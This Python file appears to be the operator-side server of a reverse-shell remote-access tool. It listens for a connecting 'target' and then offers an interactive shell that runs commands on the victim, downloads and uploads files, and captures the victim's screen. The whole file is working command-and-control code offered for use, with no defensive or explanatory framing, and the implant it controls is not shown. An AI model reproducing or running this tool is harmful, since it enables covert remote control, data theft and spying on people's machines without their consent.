#!/usr/bin/python
import socket
import json
import base64
import subprocess
import time
import os
import shutil
import sys

ipno = '127.9.0.0'
pono = 100

def rel_send(data):
	json_data = (json.dumps(data)).encode('UTF-8')
	target.send(json_data)

def rel_recv() :
	json_data = ""
	while True :
		try :
			json_data = json_data + target.recv(1024).decode('UTF-8')
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	while True:
		comm = str(input ("shell( %s ) $ " % str(ip)))
		rel_send(comm)
		if comm == "Exit" :
			break
		elif comm[:9] == "download " :
			file_name = (comm.split(" ")[1]).split("/")[-1]
			read_data = target.recv(1024)
			if read_data == b"[!!] No File Found":
				print ("[!!] No File Found")
			elif read_data == b"[!!] Can't download folder":
				print ("[!!] Can't download folder")
			else :
				try :
					with open(file_name, "wb") as f:
						while read_data:
							f.write(read_data)
							read_data = target.recv(1024)
							if read_data == b"DONE":
								break
							if read_data == b"Error Occurred":
								print ("[!!] Error Occurred")
				except :
					print ("[!!] Error Occurred")
		elif comm[:7] == "upload " :
			if not os.path.exists(comm.split(" ")[1]):
				print("[!!] No File Found")
				target.send(b"[!!!]")
			elif (os.path.isdir(comm.split(" ")[1])) :
				print("[!!] Can't upload folder")
				target.send(b"[!!!]")
			else:
				try:
					with open(comm.split(" ")[1], "rb") as f:
						file_data = f.read(1024)
						while file_data:
							target.send(file_data)
							file_data = f.read(1024)
						time.sleep(1)
						target.send(b"DONE")
				except :
					print ("[!!] Error Occurred")
					target.send(b"[!!!]")
		elif comm == "screenshot":
			try:
				file_name = time.strftime("%Y" +"-" +"%m"+"-"+ "%d"+"(" + "%H" + "_" + "%M" + "_" +"%S" +")" + ".png")
				read_data = target.recv(1024)
				if read_data == b"[!!] No File Found":
					print ("[!!] Unable to Capture Screenshot")
				else :
					with open(file_name, "wb") as f:
						while read_data:
							f.write(read_data)
							read_data = target.recv(1024)
							if read_data == b"DONE":
								break
							if read_data == b"Error Occurred":
								print ("[!!] Error Occurred")
					print(file_name + " Saved")
			except :
				print (" [!!] Error Occurred")
		else:
			answer = rel_recv()
			print(answer)

def server():
	global s
	global ip
	global target
	ipno = sys.argv[1]
	pono = sys.argv[2]
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((str(ipno),int(pono)))
	s.listen(5)
	print("Listening for incomming connection")
	target , ip = s.accept()
	print("Target connected")

if __name__ == '__main__' :
	if len(sys.argv)==3:
		a = 0
	else:
		print("Invalid statement")
		print("Syntax :- Python server.py <ip> <port>")
		sys.exit("Exiting........")
	server()
	shell()
	s.close()